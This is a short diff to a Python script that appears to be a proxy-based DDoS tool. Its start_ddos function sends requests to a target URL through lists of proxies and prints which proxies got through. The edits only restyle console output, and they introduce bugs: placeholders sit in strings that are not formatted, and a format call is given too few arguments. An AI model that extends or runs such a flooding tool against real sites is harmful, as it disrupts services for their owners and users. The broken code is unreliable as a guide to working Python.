@@ -84,7 +84,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
 			print(color+ "disturb-proxy:  {}".format(prox))
-			print("\033[104m\033[37m\033[3mThread :>\033[0m  \033[38;5;220m\033[3{start_ddos}\033[0m")
+			print("\033[104m\033[37m\033[3mThread :>\033[0m  \033[38;5;220m{active_count}\033[0m")
 			
 	except:
 		pass
@@ -113,7 +113,7 @@ def main(proxy, url):
 			fx = open(proxy)
 			array = fx.read().split()
 			print("Found {} proxies in {}.\nChecking proxies...".format(len(array)), proxy)
-			print("\033[104m\033[37m" +str(url)+ "\033[0m \033[34m")
+			print("\033[100m\033[37m{url}\033[0m \033[34m")
 			check_prox(array, url)
 		except FileNotFoundError:
 			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
